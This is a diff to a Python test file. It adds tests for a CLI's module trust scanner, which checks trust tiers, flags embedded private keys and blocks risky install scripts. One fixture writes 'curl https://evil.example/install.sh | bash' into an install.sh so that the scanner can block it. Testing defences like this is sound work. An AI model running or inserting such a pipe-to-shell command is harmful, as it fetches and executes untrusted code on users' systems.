@@ -68,6 +68,7 @@ from spark_cli.cli import (
     module_process_key,
     module_runtime_env,
     module_secret_env_bindings,
+    module_trust_tier,
     next_telegram_profile_relay_port,
     normalize_telegram_profile,
     path_is_write_denied,
@@ -84,6 +85,7 @@ from spark_cli.cli import (
     scaffold_module_files,
     validate_init_module_name,
     describe_install_risk,
+    enforce_module_trust_scan,
     enforce_runtime_versions,
     ensure_trust_for_install,
     extract_telegram_bot_token,
@@ -151,6 +153,7 @@ from spark_cli.cli import (
     split_telegram_admin_ids,
     start_module,
     stop_module,
+    scan_module_trust,
     telegram_profile_runtime_status,
     tracked_process_keys_for_module,
     wait_for_ready_check,
@@ -673,6 +676,52 @@ class SparkCliTests(unittest.TestCase):
             skip_install_commands = False
 
         ensure_trust_for_install(Args(), module, "thirdparty")
+
+    def test_module_trust_tier_treats_blessed_registry_entries_as_trusted(self) -> None:
+        module = make_module("spark-telegram-bot", ["telegram.ingress"])
+        self.assertEqual(module_trust_tier(module, "spark-telegram-bot"), "trusted")
+
+    def test_scan_module_trust_finds_private_key_material(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            module_path = Path(tmp_dir)
+            (module_path / "spark.toml").write_text("[module]\nname = \"thirdparty\"\n", encoding="utf-8")
+            (module_path / "keys.txt").write_text("-----BEGIN PRIVATE KEY-----\nabc\n", encoding="utf-8")
+            module = Module(
+                name="thirdparty",
+                path=module_path,
+                manifest={"module": {"name": "thirdparty", "version": "0.1.0", "kind": "service", "plane": "execution"}},
+            )
+            findings = scan_module_trust(module, trust_tier="community")
+        self.assertTrue(any(finding.category == "embedded-private-key" for finding in findings))
+
+    def test_enforce_module_trust_scan_blocks_community_bootstrap_pipe(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            module_path = Path(tmp_dir)
+            (module_path / "spark.toml").write_text("[module]\nname = \"thirdparty\"\n", encoding="utf-8")
+            (module_path / "install.sh").write_text("curl https://evil.example/install.sh | bash\n", encoding="utf-8")
+            module = Module(
+                name="thirdparty",
+                path=module_path,
+                manifest={"module": {"name": "thirdparty", "version": "0.1.0", "kind": "service", "plane": "execution"}},
+            )
+            with patch("spark_cli.cli.load_registry_definition", return_value={"modules": {}, "bundles": {}}):
+                with self.assertRaises(SystemExit) as error:
+                    enforce_module_trust_scan(module, "thirdparty")
+        self.assertIn("shell-pipe-installer", str(error.exception))
+
+    def test_enforce_module_trust_scan_allows_trusted_medium_findings(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            module_path = Path(tmp_dir)
+            (module_path / "spark.toml").write_text("[module]\nname = \"blessed\"\n", encoding="utf-8")
+            (module_path / "runner.py").write_text("subprocess.run('echo ok', shell=True)\n", encoding="utf-8")
+            module = Module(
+                name="blessed",
+                path=module_path,
+                manifest={"module": {"name": "blessed", "version": "0.1.0", "kind": "service", "plane": "execution"}},
+            )
+            registry = {"modules": {"blessed": {"blessed": True}}, "bundles": {}}
+            with patch("spark_cli.cli.load_registry_definition", return_value=registry):
+                enforce_module_trust_scan(module, "blessed")
 
     def test_install_progress_roundtrip_and_clear(self) -> None:
         with tempfile.TemporaryDirectory() as tmp_dir:
